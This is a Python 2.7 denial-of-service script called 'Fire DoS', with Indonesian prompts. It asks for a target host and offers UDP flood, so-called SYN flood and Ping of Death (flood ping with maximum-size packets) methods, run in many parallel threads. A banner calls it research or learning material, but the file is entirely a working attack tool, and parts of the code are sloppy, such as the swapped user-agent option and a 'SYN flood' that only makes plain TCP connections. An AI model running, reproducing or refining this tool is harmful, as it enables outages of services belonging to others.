#!/usr/bin/python2.7

import time
import random
import socket
import sys
import os
import threading

os.system('clear')

print """\033[91m
 (                     (
 )\ )                  )\ )
(()/(  (   (      (   (()/(
 /(_)) )\  )(    ))\   /(_))   (   (
(_))_|((_)(()\  /((_) (_))_    )\  )
| |_   (_) ((_)(_))    |   \  ((_)((_)
| __|  | || '_|/ -_)   | |) |/ _ \(_-<
|_|    |_||_|  \___|   |___/ \___//__/

   \033[0m"""

print "\033[94m\n========== Created By Faiz ==========\033[0m"

print "\033[103m\nSelamat datang di tools Fire Dos !....\nTools ini digunakan untuk kebutuhan research / pembelajaran!....\nPembuat tidak bertanggung jawab jika tools ini digunakan untuk keriminal !.....\033[0m"

print "\n\033[95mTools ini digunakan untuk melakukan serangan dengan metode :\033[0m \033[91mUDP flood, SYN flood, dan Ping Of Death\033[0m"

user_agent = []

user_agent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36")
user_agent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
user_agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
user_agent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
user_agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
user_agent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
user_agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
user_agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")

# Import fmly socket
s_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# Input User

host = raw_input("\n\033[94m[*]\033[0m \033[93mMasukan target anda : \033[0m")

try :
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print "\n\033[91m\033[103m[-] Pastikan anda sudah memasukan target yang benar!..\033[0m \033[0m"
    sys.exit()

metode = raw_input("\n\033[94m[*]\033[0m \033[93mMasukan metode serangan (UDP, POD, SYN)? : \033[0m")

if metode == "SYN":
    port = input("\n\033[94m[*]\033[0m \033[93mMasukan port target : \033[0m")

elif metode == "UDP":
    port = input("\n\033[94m[*]\033[0m \033[93mMasukan port target : \033[0m")

if metode == "SYN":
    useragent = raw_input("\n\033[94m[*]\033[0m \033[93mApakah anda ingin menggunakan random user agent untuk menyerang(y/n) : \033[0m")

elif metode == "UDP":
    useragent = raw_input("\n\033[94m[*]\033[0m \033[93mApakah anda ingin menggunakan random user agent untuk menyerang(y/n) : \033[0m")

if metode == "UDP":
    serangan =  input("\n\033[94m[*]\033[0m \033[93mMasukan jumlah serangan : \033[0m")

elif metode == "SYN":
    serangan = input("\n\033[94m[*]\033[0m \033[93mMasukan jumlah serangan : \033[0m")

try:
    if metode == "UDP":
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        if useragent == "y":
            def udp_dos():
                try:
                    s.close()
                    s_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s_udp.connect((str(ip),int(port)))
                    print "\n\033[92m[+]\033[0m \033[91mMenyerang {} dengan metode {}\033[0m".format(host, metode)
                    request = str("GET /?{} \nHTTP/1.1\n HOST: {}\n".format(random.randint(0, 5000), ip).encode("utf-8"))
                    s_udp.sendto(request, (str(host),int(port)))

                except UnboundLocalError:
                    s.close()
                    s_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s_udp.connect((str(ip),int(port)))
                    print "\n\033[92m[+]\033[0m \033[91mMenyerang {} dengan metode {}\033[0m".format(host, metode)
                    request = str("GET /?{} \nHTTP/1.1\n HOST: {}\n".format(random.randint(0, 5000), ip).encode("utf-8"))
                    s_udp.sendto(request, (str(ip),int(port)))

        elif useragent == "n":
            def udp_dos():
                try:
                    s.close()
                    s_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s_udp.connect((str(ip),int(port)))
                    print "\n\033[92m[+]\033[0m \033[91mMenyerang {} dengan metode {}\033[0m".format(host, metode)
                    request = str("GET /?{} \nHTTP/1.1\n HOST: {}\n User-Agent: {}\n".format(random.randint(0, 5000), ip, random.choice(user_agent)).encode("utf-8"))
                    s_udp.sendto(request, (str(ip),int(port)))

                except UnboundLocalError:
                    s.close()
                    s_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s_udp.connect((str(ip),int(port)))
                    print "\n\033[92m[+]\033[0m \033[91mMenyerang {} dengan metode {}\033[0m".format(host, metode)
                    request = str("GET /?{} \nHTTP/1.1\n HOST: {}\n User-Agent: {}\n".format(random.randint(0, 5000), ip, random.choice(user_agent)).encode("utf-8"))
                    s_udp.sendto(request, (str(ip),int(port)))
        threads = []
        for i in range(serangan):
            th = threading.Thread(target=udp_dos)
            th.start()
            threads.append(th)
        for i in threads:
            i.join()

    elif metode == "POD":
        if os.system("sudo ping -f -s 65507 {}".format(ip)):
            print "\n\033[103m[#]\033[0m \033[92mSelesai menyerang {} dengan metode {} \033[0m".format(host, metode)
            print "\n\033[92m[+] Bye\033[0m"
            sys.exit()

    elif metode == "SYN":
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if useragent == "y":
            def syn_dos():
                try:
                    s.close()
                    s_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s_tcp.connect((str(ip),int(port)))
                    print "\n\033[92m[+]\033[0m \033[91mMenyerang {} dengan metode {}\033[0m".format(host, metode)
                    s_tcp.send("GET /?{} \nHTTP/1.1\n HOST: {}\n".format(random.randint(0, 5000), ip).encode("utf-8"))

                except UnboundLocalError:
                    s.close
                    s_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s_tcp.connect((str(ip),int(port)))
                    print "\n\033[92m[+]\033[0m \033[91mMenyerang {} dengan metode {}\033[0m".format(host, metode)
                    s_tcp.send("GET /?{} \nHTTP/1.1\n HOST: {}\n".format(random.randint(0, 5000), ip).encode("utf-8"))

        elif useragent == "n":
            def syn_dos():
                try:
                    s.close()
                    s_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s_tcp.connect((str(ip),int(port)))
                    print "\n\033[92m[+]\033[0m \033[91mMenyerang {} dengan metode {}\033[0m".format(host, metode)
                    s_tcp.send("GET /?{} \nHTTP/1.1\n HOST: {}\n User-Agent: {}\n".format(random.randint(0, 5000), ip, random.choice(user_agent)).encode("utf-8"))

                except UnboundLocalError:
                    s.close()
                    s_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s_tcp.connect((str(ip),int(port)))
                    print "\n\033[92m[+]\033[0m \033[91mMenyerang {} dengan metode {}\033[0m".format(host, metode)
                    s_tcp.send("GET /?{} \nHTTP/1.1\n HOST: {}\n User-Agent: {}\n".format(random.randint(0, 5000), ip, random.choice(user_agent)).encode("utf-8"))

        threads = []

        for i in range(serangan):
            th = threading.Thread(target=syn_dos)
            th.start()
            threads.append(th)
            time.sleep(0.1)
        for i in threads:
            i.join()

    else :
        print "\n\033[91m[-] Pastikan anda memasukan metode Dos yang benar!...\033[0m"
        print "\n\033[92m[+]\033[0m \033[104mClosing socket please wait...\033[0m"
        time.sleep(2.0)
        s_tcp.close()
        s_udp.close()
        print "\n\033[92m[+] Bye\033[0m"
        sys.exit()

except KeyboardInterrupt, SystemExit:
    print "\n\033[103m[#]\033[0m \033[92mSelesai menyerang {} dengan metode {} \033[0m".format(host, metode)
    print "\n\033[92m[+]\033[0m \033[104mClosing socket please wait...\033[0m"
    time.sleep(2.0)
    s_tcp.close()
    s_udp.close()
    print "\n\033[92m[+] Bye\033[0m"
    sys.exit()

# except socket.error:
#     print "\033[91m[+] Tidak mendapatkan koneksi dari server kemungkinan server down!......\033[0m"

finally:
    s_tcp.close()
    s_udp.close()
